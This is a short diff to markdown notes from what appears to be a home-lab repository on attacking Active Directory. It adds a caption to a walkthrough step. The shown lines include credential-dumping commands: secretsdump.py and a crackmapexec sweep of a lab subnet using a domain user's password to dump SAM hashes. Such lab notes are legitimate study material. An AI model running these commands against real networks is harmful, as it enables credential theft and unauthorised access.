@@ -34,7 +34,8 @@ https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4
 1. secretsdump.py marval/fcastle:Ari123a123@192.168.59.130
  ![image](https://github.com/ArielElb/Hacking-Active-Directory/assets/94087682/1bc081fe-0c05-4e48-8697-381e2e784916)
 
-2. crackmapexec smb 192.168.59.0/24 -u fcastle -d marval.local -p Ari123a123 --sam
+2. dumping the hashes in the SAM file when we got a user
+crackmapexec smb 192.168.59.0/24 -u fcastle -d marval.local -p Ari123a123 --sam
 
 ![image](https://github.com/ArielElb/Hacking-Active-Directory/assets/94087682/d82819ee-059e-4f47-8a42-ef9df98192f2)
 
